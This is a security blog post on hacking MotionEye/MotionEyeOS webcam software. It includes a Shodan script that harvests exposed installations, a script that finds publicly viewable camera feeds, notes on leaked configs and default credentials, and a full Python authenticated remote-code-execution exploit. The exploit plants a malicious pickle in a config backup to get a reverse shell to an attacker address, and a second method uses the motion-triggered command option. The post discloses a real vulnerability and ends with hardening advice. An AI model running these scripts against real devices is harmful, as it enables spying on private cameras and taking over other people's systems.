<!DOCTYPE html> <!--[if IE 7]><html class="ie ie7" lang="en-US" prefix="og: https://ogp.me/ns#"> <![endif]--> <!--[if IE 8]><html class="ie ie8" lang="en-US" prefix="og: https://ogp.me/ns#"> <![endif]--> <!--[if !(IE 7) & !(IE 8)]><!--><html lang="en-US" prefix="og: https://ogp.me/ns#"> <!--<![endif]--><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><link media="all" href="https://www.pizzapower.me/blog/wp-content/cache/autoptimize/css/autoptimize_e920900305b606ea0862c1b07eebb0b4.css" rel="stylesheet"><title>Hacking MotionEye/MotionEyeOS - Pizza-Powered Hacking üçï</title><link rel="profile" href="https://gmpg.org/xfn/11" /><link rel="pingback" href="https://www.pizzapower.me/blog/xmlrpc.php"> <!--[if lt IE 9]> <script src="https://www.pizzapower.me/blog/wp-content/themes/twentytwelve/js/html5.js?ver=3.7.0" type="text/javascript"></script> <![endif]--><meta name="description" content="MotionEye is an open source, web-based GUI for the popular Motion CLI application found on Linux. I&#039;ve known of the Motion command line app for years, but I"/><meta name="robots" content="index, follow, max-snippet:-1, max-video-preview:-1, max-image-preview:large"/><link rel="canonical" href="https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/" /><meta property="og:locale" content="en_US" /><meta property="og:type" content="article" /><meta property="og:title" content="Hacking MotionEye/MotionEyeOS - Pizza-Powered Hacking üçï" /><meta property="og:description" content="MotionEye is an open source, web-based GUI for the popular Motion CLI application found on Linux. I&#039;ve known of the Motion command line app for years, but I" /><meta property="og:url" content="https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/" /><meta property="og:site_name" content="Pizza-Powered Hacking üçï" /><meta property="article:tag" content="cyber" /><meta property="article:tag" content="cybersecurity" /><meta property="article:tag" content="hacking" /><meta property="article:tag" content="infosec" /><meta property="article:tag" content="motioneye" /><meta property="article:tag" content="offsec" /><meta property="article:tag" content="python" /><meta property="article:tag" content="self hosting" /><meta property="article:tag" content="shodan" /><meta property="article:section" content="blog" /><meta property="og:updated_time" content="2022-01-31T22:28:40+00:00" /><meta property="og:image" content="https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png" /><meta property="og:image:secure_url" content="https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png" /><meta property="og:image:width" content="893" /><meta property="og:image:height" content="823" /><meta property="og:image:alt" content="Hacking MotionEye/MotionEyeOS" /><meta property="og:image:type" content="image/png" /><meta property="article:published_time" content="2021-10-09T12:36:00+00:00" /><meta property="article:modified_time" content="2022-01-31T22:28:40+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Hacking MotionEye/MotionEyeOS - Pizza-Powered Hacking üçï" /><meta name="twitter:description" content="MotionEye is an open source, web-based GUI for the popular Motion CLI application found on Linux. I&#039;ve known of the Motion command line app for years, but I" /><meta name="twitter:image" content="https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png" /><meta name="twitter:label1" content="Written by" /><meta name="twitter:data1" content="pizzapower" /><meta name="twitter:label2" content="Time to read" /><meta name="twitter:data2" content="8 minutes" /> <script type="application/ld+json" class="rank-math-schema">{"@context":"https://schema.org","@graph":[{"@type":["Person","Organization"],"@id":"https://www.pizzapower.me/#person","name":"Pizza-Powered Hacking \ud83c\udf55","logo":{"@type":"ImageObject","@id":"https://www.pizzapower.me/#logo","url":"https://www.pizzapower.me/blog/wp-content/uploads/2020/10/88c11b8403dc79bdfd0548cd7aca5870.png","contentUrl":"https://www.pizzapower.me/blog/wp-content/uploads/2020/10/88c11b8403dc79bdfd0548cd7aca5870.png","caption":"Pizza-Powered Hacking \ud83c\udf55","inLanguage":"en-US","width":"300","height":"300"},"image":{"@type":"ImageObject","@id":"https://www.pizzapower.me/#logo","url":"https://www.pizzapower.me/blog/wp-content/uploads/2020/10/88c11b8403dc79bdfd0548cd7aca5870.png","contentUrl":"https://www.pizzapower.me/blog/wp-content/uploads/2020/10/88c11b8403dc79bdfd0548cd7aca5870.png","caption":"Pizza-Powered Hacking \ud83c\udf55","inLanguage":"en-US","width":"300","height":"300"}},{"@type":"WebSite","@id":"https://www.pizzapower.me/#website","url":"https://www.pizzapower.me","name":"Pizza-Powered Hacking \ud83c\udf55","alternateName":"pizza power","publisher":{"@id":"https://www.pizzapower.me/#person"},"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png","url":"https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png","width":"200","height":"200","inLanguage":"en-US"},{"@type":"WebPage","@id":"https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/#webpage","url":"https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/","name":"Hacking MotionEye/MotionEyeOS - Pizza-Powered Hacking \ud83c\udf55","datePublished":"2021-10-09T12:36:00+00:00","dateModified":"2022-01-31T22:28:40+00:00","isPartOf":{"@id":"https://www.pizzapower.me/#website"},"primaryImageOfPage":{"@id":"https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png"},"inLanguage":"en-US"},{"@type":"Person","@id":"https://www.pizzapower.me/author/pizzapower/","name":"pizzapower","url":"https://www.pizzapower.me/author/pizzapower/","image":{"@type":"ImageObject","@id":"https://secure.gravatar.com/avatar/88c11b8403dc79bdfd0548cd7aca5870?s=96&amp;d=retro&amp;r=g","url":"https://secure.gravatar.com/avatar/88c11b8403dc79bdfd0548cd7aca5870?s=96&amp;d=retro&amp;r=g","caption":"pizzapower","inLanguage":"en-US"},"sameAs":["http://www.pizzapower.me/blog"]},{"@type":"BlogPosting","headline":"Hacking MotionEye/MotionEyeOS - Pizza-Powered Hacking \ud83c\udf55","datePublished":"2021-10-09T12:36:00+00:00","dateModified":"2022-01-31T22:28:40+00:00","articleSection":"blog, coding, cybersecurity, security, self hosting","author":{"@id":"https://www.pizzapower.me/author/pizzapower/","name":"pizzapower"},"publisher":{"@id":"https://www.pizzapower.me/#person"},"description":"MotionEye is an open source, web-based GUI for the popular Motion CLI application found on Linux. I&#039;ve known of the Motion command line app for years, but I","name":"Hacking MotionEye/MotionEyeOS - Pizza-Powered Hacking \ud83c\udf55","@id":"https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/#richSnippet","isPartOf":{"@id":"https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/#webpage"},"image":{"@id":"https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png"},"inLanguage":"en-US","mainEntityOfPage":{"@id":"https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/#webpage"}}]}</script> <link rel='dns-prefetch' href='//www.googletagmanager.com' /><link rel="alternate" type="application/rss+xml" title="Pizza-Powered Hacking üçï &raquo; Feed" href="https://www.pizzapower.me/feed/" /><link rel="alternate" type="application/rss+xml" title="Pizza-Powered Hacking üçï &raquo; Comments Feed" href="https://www.pizzapower.me/comments/feed/" /> <script type="text/javascript">window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.pizzapower.me\/blog\/wp-includes\/js\/wp-emoji-release.min.js"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);</script> <!--[if lt IE 9]><link rel='stylesheet' id='twentytwelve-ie-css' href='https://www.pizzapower.me/blog/wp-content/themes/twentytwelve/css/ie.css' type='text/css' media='all' /> <![endif]--> <script type="text/javascript" src="https://www.pizzapower.me/blog/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>    <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-ZRV0FZPLEL" id="google_gtagjs-js" async></script> <script type="text/javascript" id="google_gtagjs-js-after">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag("set","linker",{"domains":["www.pizzapower.me"]});
gtag("js", new Date());
gtag("set", "developer_id.dZTNiMT", true);
gtag("config", "G-ZRV0FZPLEL");</script>  <script type="text/javascript" id="whp7014front.js6897-js-extra">var whp_local_data = {"add_url":"https:\/\/www.pizzapower.me\/wp-admin\/post-new.php?post_type=event","ajaxurl":"https:\/\/www.pizzapower.me\/blog\/wp-admin\/admin-ajax.php"};</script> <link rel="https://api.w.org/" href="https://www.pizzapower.me/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.pizzapower.me/wp-json/wp/v2/posts/320" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.pizzapower.me/blog/xmlrpc.php?rsd" /><link rel='shortlink' href='https://www.pizzapower.me/?p=320' /><link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.pizzapower.me/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.pizzapower.me%2F2021%2F10%2F09%2Fself-hosted-security-part-1-motioneye%2F" /><link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.pizzapower.me/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.pizzapower.me%2F2021%2F10%2F09%2Fself-hosted-security-part-1-motioneye%2F&#038;format=xml" /><meta name="generator" content="Site Kit by Google 1.140.0" /><link rel="icon" href="https://www.pizzapower.me/blog/wp-content/uploads/2020/09/cropped-pizza-2-32x32.png" sizes="32x32" /><link rel="icon" href="https://www.pizzapower.me/blog/wp-content/uploads/2020/09/cropped-pizza-2-192x192.png" sizes="192x192" /><link rel="apple-touch-icon" href="https://www.pizzapower.me/blog/wp-content/uploads/2020/09/cropped-pizza-2-180x180.png" /><meta name="msapplication-TileImage" content="https://www.pizzapower.me/blog/wp-content/uploads/2020/09/cropped-pizza-2-270x270.png" /></head><body class="post-template-default single single-post postid-320 single-format-standard custom-background wp-embed-responsive custom-font-enabled single-author"><div id="page" class="hfeed site"><header id="masthead" class="site-header"><hgroup><h1 class="site-title"><a href="https://www.pizzapower.me/" rel="home">Pizza-Powered Hacking üçï</a></h1><h2 class="site-description"></h2></hgroup><nav id="site-navigation" class="main-navigation"> <button class="menu-toggle">Menu</button> <a class="assistive-text" href="#content">Skip to content</a><div class="menu-menu-1-container"><ul id="menu-menu-1" class="nav-menu"><li id="menu-item-912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-912"><a href="https://www.pizzapower.me/">Home</a></li><li id="menu-item-914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-914"><a href="https://pizzapower.me/whoami">whoami</a></li></ul></div></nav></header><div id="main" class="wrapper"><div id="primary" class="site-content"><div id="content" role="main"><article id="post-320" class="post-320 post type-post status-publish format-standard hentry category-blog category-coding category-cybersecurity category-security category-self-hosting tag-cyber tag-cybersecurity tag-hacking tag-infosec tag-motioneye tag-offsec tag-python tag-self-hosting tag-shodan"><header class="entry-header"><h1 class="entry-title">Hacking MotionEye/MotionEyeOS</h1></header><div class="entry-content"><h2 class="wp-block-heading" id="getting-started-with-motioneye">Getting Started with MotionEye</h2><p><a href="https://github.com/ccrisan/motioneye" target="_blank" rel="noopener">MotionEye</a> is an open source, web-based GUI for the popular <a href="https://motion-project.github.io/" target="_blank" rel="noopener">Motion</a> CLI application found on Linux.  I&#8217;ve known of the Motion command line app for years, but I didn&#8217;t know that MotionEye existed. I ran across it while trying to find a multiple webcam, GUI or web based solution for future projects.</p><p>MotionEye comes in a couple forms &#8211; a standalone app, which I used the <a href="https://hub.docker.com/r/ccrisan/motioneye" target="_blank" rel="noopener">docker container version</a> of, or a &#8220;whole&#8221; operating system, <a href="https://github.com/ccrisan/motioneyeos" target="_blank" rel="noopener">MotionEyeOS</a>, to install on a Raspberry Pi.</p><p>Starting off, I used Shodan search to find internet facing installations. Here is the script I used for that. If you use this script, you&#8217;ll need to put in your API key and the limit parameter, which limits the API queries that you use.</p><pre class="wp-block-code"><code>#!/usr/bin/env python3

import sys
# pip3 install shodan
from shodan import Shodan
import requests

# check for api key
api = Shodan('') # Insert API key here

if api.api_key == '':
    print("No API key found! Exiting")
    sys.exit(1)

limit = 1000 # set this to limit your api query usage
counter = 0

url_file = open("urls.txt", "w")

for response in api.search_cursor('Server: motionEye'):
    ip = response&#91;'ip_str']
    port = response&#91;'port']
    url = f'http://{ip}:{port}'
    url_file.write(url + '\n')

    # Keep track of how many results have been downloaded so we don't use up all our query credits
    counter += 1
    if counter &gt;= limit:
        break

url_file.close()</code></pre><p>I ran out of query credits when I ran this script. There are thousands of installations out there. This script will output the IP addresses of those installations.</p><h2 class="wp-block-heading" id="finding-live-feeds">Finding Live Feeds</h2><p>In my review of the application, I found that you can make a query to the <em>/picture/{camera-number}/current/</em> endpoint, and if it returns a 200 status code, it means that the feed is open to the public. You can also increment the camera-number an enumerate the numbers of cameras a feed will actually have, even if it isn&#8217;t available to view.</p><p>I took the output of motioneye-shodan.py script above, and fed it to live-feeds.py script below.</p><pre class="wp-block-code"><code>#!/usr/bin/env python3

import requests

url_file = open("urls.txt", "r")
urls = url_file.readlines()
url_file.close()

live_urls = open("live-urls.txt", "w")

for url in urls:
    try:
        response = requests.get(url + "/picture/0/current/", verify=False, timeout=3).status_code
        print(response)
        if response == 200:
            live_urls.write(url)
    except:
        pass

live_urls.close()</code></pre><p>This script outputs the URL of camera feeds that we can view. But the real question here is, what security issues are there with MotionEye?</p><h2 class="wp-block-heading" id="information-leakage">Information Leakage</h2><p>It turns out that if you make a get request to the following endpoint <em>/config/list</em>, some of the feeds will return their config files. Most of the time these config files are innocuous. I&#8217;m not sure why these are publicly accessible even if the feed is publicly accessible. Maybe it is used as an API endpoint of some sort. I need to dig into the code some more.</p><p>However, sometimes these config files contain some very sensitive information. Consider the following config with <em>email_notifications_smtp_password</em> and <em>email_notifications_addresses</em> removed. These passwords are supposed to be for services that the public cannot access, but unfortunately people like to reuse passwords. Again, why is this file even readable?</p><figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="893" height="823" src="https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png" alt="" class="wp-image-337" srcset="https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png 893w, https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22-300x276.png 300w, https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22-768x708.png 768w, https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22-624x575.png 624w" sizes="(max-width: 893px) 100vw, 893px" /></figure><p>Along with the occasional password, email addresses are in here, internal IP addresses and ports, mounting points for local drives, etc.</p><h2 class="wp-block-heading" id="rate-limiting-and-default-credentials">Rate-Limiting and Default Credentials</h2><p>So, the default installation of MotionEye uses the username of admin and a blank password. Additionally, MotionEye does not seem to institute any sort of rate limiting on login attempts. This is a recipe for disaster.</p><h2 class="wp-block-heading" id="authenticated-rce-method-1">Authenticated RCE Method #1</h2><p>Once logged in, I found two simple methods of code execution. The first of which is a classic Python cPickle deserialization exploit.</p><p>In the configuration section of the application, there is an option to backup and restore the application configurations. It turns out that if you include a malicious tasks.pickle file in the config you are restoring with, it&#8217;ll be written to disk and will be loaded when the application is restarted automatically or manually.</p><p>You can simply download the current configuration to use it as a template. After downloading and extracting it, slide your malicious tasks.pickle file and tar.gz everything back up.</p><p>The final structure of my motioneye-config.tar.gz for the docker container is as follows:</p><p>‚îú‚îÄ‚îÄ camera-1.conf<br>‚îú‚îÄ‚îÄ motion.conf<br>‚îú‚îÄ‚îÄ motioneye.conf<br>‚îî‚îÄ‚îÄ tasks.pickle</p><p>Alternatively, the final structure of my motioneye-config.tar.gz lon MotionEyeOS is the following:</p><p>‚îú‚îÄ‚îÄ adjtime<br>‚îú‚îÄ‚îÄ camera-1.conf<br>‚îú‚îÄ‚îÄ crontabs<br>‚îú‚îÄ‚îÄ date.conf<br>‚îú‚îÄ‚îÄ localtime -&gt; /usr/share/zoneinfo/UTC<br>‚îú‚îÄ‚îÄ motion.conf<br>‚îú‚îÄ‚îÄ motioneye.conf<br>‚îú‚îÄ‚îÄ ntp.conf<br>‚îú‚îÄ‚îÄ os.conf<br>‚îú‚îÄ‚îÄ proftpd.conf<br>‚îú‚îÄ‚îÄ shadow<br>‚îú‚îÄ‚îÄ shadow-<br>‚îú‚îÄ‚îÄ smb.conf<br>‚îú‚îÄ‚îÄ ssh<br>‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ssh_host_dsa_key<br>‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ssh_host_dsa_key.pub<br>‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ssh_host_ecdsa_key<br>‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ssh_host_ecdsa_key.pub<br>‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ssh_host_ed25519_key<br>‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ssh_host_ed25519_key.pub<br>‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ssh_host_rsa_key<br>‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ ssh_host_rsa_key.pub<br>‚îú‚îÄ‚îÄ static_ip.conf<br>‚îú‚îÄ‚îÄ tasks.pickle<br>‚îú‚îÄ‚îÄ version<br>‚îú‚îÄ‚îÄ watch.conf<br>‚îî‚îÄ‚îÄ wpa_supplicant.conf</p><p>Pause here: You see, those are ssh keys. So you say why don&#8217;t we just try ssh? Go for it. You also may not even need a password, but some people have either secured ssh or disabled ssh on the actually raspberry pi, so it won&#8217;t work. A lot of these instances will have ssh turned off, and if it is running in docker, you probably won&#8217;t be able to download the ssh keys. Also, it is more fun to write scripts in Python.</p><p>Once the configuration is uploaded, wait for the app to reload, or, in unfortunate cases, wait for the app to be reloaded by mother nature or the victim. From what I can see, the docker application will not autoreboot. Here is a Python 3 script that will do all of this. Also, see the <a href="https://github.com/pizza-power/motioneye-authenticated-RCE" target="_blank" rel="noopener">github repo</a>, which may be more updated.</p><pre class="wp-block-code"><code>#!/usr/bin/env python3

import requests
import argparse
import os
import pickle
import hashlib
import tarfile
import time
import string
import random
from requests_toolbelt import MultipartEncoder
import json


# proxies = {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"}
proxies = {}


def get_cli_args():
    parser = argparse.ArgumentParser(description="MotionEye Authenticated RCE Exploit")
    parser.add_argument(
        "--victim",
        help="Victim url in format ip:port, or just ip if port 80",
        required=True,
    )
    parser.add_argument("--attacker", help="ipaddress:port of attacker", required=True)
    parser.add_argument(
        "--username", help="username of web interface, default=admin", default="admin"
    )
    parser.add_argument(
        "--password", help="password of web interface, default=blank", default=""
    )
    args = parser.parse_args()
    return args


def login(username, password, victim_url):
    session = requests.Session()
    useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    headers = {"User-Agent": useragent}
    login_url = f"http://{victim_url}/login/"
    body = f"username={username}&amp;password={password}"
    session.post(login_url, headers=headers, data=body)
    return session


def download_config(username, victim_url, session):
    download_url = f"http://{victim_url}/config/backup/?_username={username}&amp;_signature=5907c8158417212fbef26936d3e5d8a04178b46f"
    backup_file = session.get(download_url)
    open("motioneye-config.tar.gz", "wb").write(backup_file.content)
    return


def create_pickle(ip_address, port):
    shellcode = ""  # put your shellcode here

    class EvilPickle(object):
        def __reduce__(self):
            cmd = shellcode
            return os.system, (cmd,)

    # need protocol=2 and fix_imports=True for python2 compatibility
    pickle_data = pickle.dumps(EvilPickle(), protocol=2, fix_imports=True)
    with open("tasks.pickle", "wb") as file:
        file.write(pickle_data)
        file.close()
    return


def decompress_add_file_recompress():
    with tarfile.open("./motioneye-config.tar.gz") as original_backup:
        original_backup.extractall("./motioneye-config")
        original_backup.close()
    original_backup.close()
    os.remove("./motioneye-config.tar.gz")
    # move malicious tasks.pickle into the extracted directory and then tar and gz it back up
    os.rename("./tasks.pickle", "./motioneye-config/tasks.pickle")
    with tarfile.open("./motioneye-config.tar.gz", "w:gz") as config_tar:
        config_tar.add("./motioneye-config/", arcname=".")
    config_tar.close()
    return


def restore_config(username, password, victim_url, session):
    # a lot of this is not necessary, but makes for good tradecraft
    # recreated 'normal' requests as closely as I could
    t = int(time.time() * 1000)
    path = f"/config/restore/?_={t}&amp;_username={username}"
    # admin_hash is the sha1 hash of the admin's password, which is '' in the default case
    admin_hash = hashlib.sha1(password.encode("utf-8")).hexdigest().lower()
    signature = (
        hashlib.sha1(f"POST:{path}::{admin_hash}".encode("utf-8")).hexdigest().lower()
    )
    restore_url = f"http://{victim_url}/config/restore/?_={t}&amp;_username=admin&amp;_signature={signature}"

    # motioneye checks for "---" as a form boundary. Python Requests only prepends "--"
    # so we have to manually create this
    files = {
        "files": (
            "motioneye-config.tar.gz",
            open("motioneye-config.tar.gz", "rb"),
            "application/gzip",
        )
    }

    useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    boundary = "----WebKitFormBoundary" + "".join(
        random.sample(string.ascii_letters + string.digits, 16)
    )

    m = MultipartEncoder(fields=files, boundary=boundary)
    headers = {
        "Content-Type": m.content_type,
        "User-Agent": useragent,
        "X-Requested-With": "XMLHttpRequest",
        "Cookie": "meye_username=_; monitor_info_1=; motion_detected_1=false; capture_fps_1=5.6",
        "Origin": f"http://{victim_url}",
        "Referer": f"http://{victim_url}",
        "Accept-Language": "en-US,en;q=0.9",
    }
    response = session.post(restore_url, data=m, headers=headers, proxies=proxies)
    # if response == reboot false then we need reboot routine
    content = json.loads(response.content.decode("utf-8"))

    if content&#91;"reboot"] == True:
        print("Rebooting! Stand by for shell!")
    else:
        print("Manual reboot needed!")
    return


if __name__ == "__main__":
    print("Running exploit!")
    arguments = get_cli_args()
    session = login(arguments.username, arguments.password, arguments.victim)
    download_config(arguments.username, arguments.victim, session)
    # sends attacker ip and port as arguments to create the pickle
    create_pickle(arguments.attacker.split(":")&#91;0], arguments.attacker.split(":")&#91;1])
    decompress_add_file_recompress()
    restore_config(arguments.username, arguments.password, arguments.victim, session)
</code></pre><h2 class="wp-block-heading" id="authenticated-rce-method-2">Authenticated RCE Method #2</h2><p>Another method of code execution involves motion detection. There is an option to run a system command whenever motion is detected. The security implications of this are obvious.</p><figure class="wp-block-image size-large"><img decoding="async" width="1024" height="591" src="https://www.pizzapower.me/blog/wp-content/uploads/2021/10/rce-motioneye-1024x591.jpg" alt="" class="wp-image-331" srcset="https://www.pizzapower.me/blog/wp-content/uploads/2021/10/rce-motioneye-1024x591.jpg 1024w, https://www.pizzapower.me/blog/wp-content/uploads/2021/10/rce-motioneye-300x173.jpg 300w, https://www.pizzapower.me/blog/wp-content/uploads/2021/10/rce-motioneye-768x443.jpg 768w, https://www.pizzapower.me/blog/wp-content/uploads/2021/10/rce-motioneye-624x360.jpg 624w, https://www.pizzapower.me/blog/wp-content/uploads/2021/10/rce-motioneye.jpg 1510w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>python rev shell</figcaption></figure><h2 class="wp-block-heading" id="conclusion">Conclusion</h2><p>While authentication is needed for RCE, the presence of default credentials and lack of rate limiting make obtaining authentication straightforward. There are a lot of people running this software in a vulnerable manner.</p><p>As per my usual advice, don&#8217;t expose MotionEye to the WWW. Like all the self-hosted solutions, I advise you to install this to face your internal network and then connect to your internal network via OpenVPN or Wireguard.</p><p>Update: I was give CVE-2021-44255 for the python pickle exploit.</p></div><footer class="entry-meta"> This entry was posted in <a href="https://www.pizzapower.me/category/blog/" rel="category tag">blog</a>, <a href="https://www.pizzapower.me/category/coding/" rel="category tag">coding</a>, <a href="https://www.pizzapower.me/category/cybersecurity/" rel="category tag">cybersecurity</a>, <a href="https://www.pizzapower.me/category/security/" rel="category tag">security</a>, <a href="https://www.pizzapower.me/category/self-hosting/" rel="category tag">self hosting</a> and tagged <a href="https://www.pizzapower.me/tag/cyber/" rel="tag">cyber</a>, <a href="https://www.pizzapower.me/tag/cybersecurity/" rel="tag">cybersecurity</a>, <a href="https://www.pizzapower.me/tag/hacking/" rel="tag">hacking</a>, <a href="https://www.pizzapower.me/tag/infosec/" rel="tag">infosec</a>, <a href="https://www.pizzapower.me/tag/motioneye/" rel="tag">motioneye</a>, <a href="https://www.pizzapower.me/tag/offsec/" rel="tag">offsec</a>, <a href="https://www.pizzapower.me/tag/python/" rel="tag">python</a>, <a href="https://www.pizzapower.me/tag/self-hosting/" rel="tag">self hosting</a>, <a href="https://www.pizzapower.me/tag/shodan/" rel="tag">shodan</a> on <a href="https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/" title="12:36 pm" rel="bookmark"><time class="entry-date" datetime="2021-10-09T12:36:00+00:00">October 9, 2021</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="https://www.pizzapower.me/author/pizzapower/" title="View all posts by pizzapower" rel="author">pizzapower</a></span></span>.</footer></article><nav class="nav-single"><h3 class="assistive-text">Post navigation</h3> <span class="nav-previous"><a href="https://www.pizzapower.me/2021/10/06/ive-never-heard-of-nim/" rel="prev"><span class="meta-nav">&larr;</span> I&#8217;ve Never Heard of Nim</a></span> <span class="nav-next"><a href="https://www.pizzapower.me/2021/11/09/tesla-solar-powerwalls-docker-python-and-crypto-mining/" rel="next">Tesla Solar, Powerwalls, Docker, Python, and Crypto Mining <span class="meta-nav">&rarr;</span></a></span></nav><div id="comments" class="comments-area"></div></div></div><div id="secondary" class="widget-area" role="complementary"><aside id="search-2" class="widget widget_search"><form role="search" method="get" id="searchform" class="searchform" action="https://www.pizzapower.me/"><div> <label class="screen-reader-text" for="s">Search for:</label> <input type="text" value="" name="s" id="s" /> <input type="submit" id="searchsubmit" value="Search" /></div></form></aside><aside id="recent-posts-2" class="widget widget_recent_entries"><h3 class="widget-title">Recent Posts</h3><ul><li> <a href="https://www.pizzapower.me/2024/11/13/mura-masa-cms-sql-injection-cve-2024-32640/">Mura/Masa CMS &#8211; SQL Injection CVE-2024-32640</a></li><li> <a href="https://www.pizzapower.me/2024/07/25/ios-16-7-8-jailbreak-on-iphone-x/">iOS 16.7.8 Jailbreak on 